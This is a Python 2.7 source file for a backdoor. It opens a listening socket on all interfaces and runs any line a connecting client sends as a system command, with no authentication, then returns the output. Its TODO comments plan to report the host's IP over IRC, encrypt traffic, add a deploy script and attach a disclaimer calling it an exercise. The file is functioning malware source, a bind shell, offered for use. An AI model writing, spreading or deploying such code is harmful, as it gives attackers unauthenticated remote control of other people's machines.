#!/usr/bin/env python

# developed for python 2.7

import sys
import socket
import argparse
import subprocess
import logging
from threading import Thread

# TODO ping someone/somewhere and give ip info (irc ?)
# TODO write proper readme
# TODO write disclaimer, "this is an exercice, not responsible for blabla"
# TODO encrypt communications
# TODO should be cross-platform
# TODO deploy script


class Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = socket.socket()

    def connect(self):
        self.socket.connect((self.host, self.port))

    def disconnect(self):
        self.socket.close()


class Server(object):

    LOGGING_DFT_FORMAT = "(%(asctime)s %(levelname)s) %(message)s"
    LOGGING_LEVELS = {
        "critical": logging.CRITICAL,
        "error":    logging.ERROR,
        "warning":  logging.WARNING,
        "info":     logging.INFO,
        "debug":    logging.DEBUG
    }

    def __init__(self, port=4242, backlog=5, log_level="info",
                 log_format=LOGGING_DFT_FORMAT,
                 timeout=5, **kwargs):
        logging.basicConfig(level=Server.LOGGING_LEVELS[log_level],
                            format=log_format)
        self.servsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.servsocket.settimeout(timeout)
        self.servsocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.servsocket.bind(("", port))  # bind on all interfaces
        self.servsocket.listen(backlog)
        self.should_stop = True
        self.threads = []

    def run(self):
        self.should_stop = False

        while not self.should_stop:
            try:
                clientsocket, clientaddress = self.servsocket.accept()
                self.threads.append(Thread(target=self.handle_client,
                                           args=(clientsocket, clientaddress)))
                self.threads[-1].start()
            except socket.timeout:
                self.handle_timeout()

        for thread in self.threads:
            thread.join()

    def handle_client(self, socket, address):
        socket.settimeout(None)  # remove timeout inherited from the servsocket

    def handle_timeout(self):
        pass


class Backdoor(Server):
    def __init__(self, ping=True, **kwargs):
        super(Backdoor, self).__init__(**kwargs)
        self.should_ping = ping

    def handle_client(self, socket, address):
        super(Backdoor, self).handle_client(socket, address)
        f = socket.makefile()

        while not self.should_stop:
            line = f.readline()
            if len(line) == 0:
                break
            elif line[-1] == '\n':
                if len(line) == 1:
                    continue
                line = line[:-1]

            try:
                out = subprocess.check_output(line)
                socket.send(out)
            except Exception as e:
                socket.send(str(e))

        socket.close()
        logging.info("Connection with " + address[0] + ":" +
                     str(address[1]) + " closed")

    def handle_timeout(self):
        print("zobb")


def main():
    parser = argparse.ArgumentParser(description="zobb")
    parser.add_argument("-p", "--port", type=int, action="store", default=4242,
                        help="listening port")
    parser.add_argument("--backlog", type=int, action="store", default=5,
                        help="max simultaneous clients")
    parser.add_argument("--timeout", type=int, action="store", default=5,
                        help="accepting timeout in seconds")
    parser.add_argument("--log", action="store", choices=Server.LOGGING_LEVELS,
                        default="info", help="log level")
    parser.add_argument("--no-ping", action="store_false", dest="ping",
                        default=True, help="disable ping")
    args = parser.parse_args(sys.argv[1:])

    backdoor = Backdoor(**vars(args))
    backdoor.run()


if __name__ == "__main__":
    main()
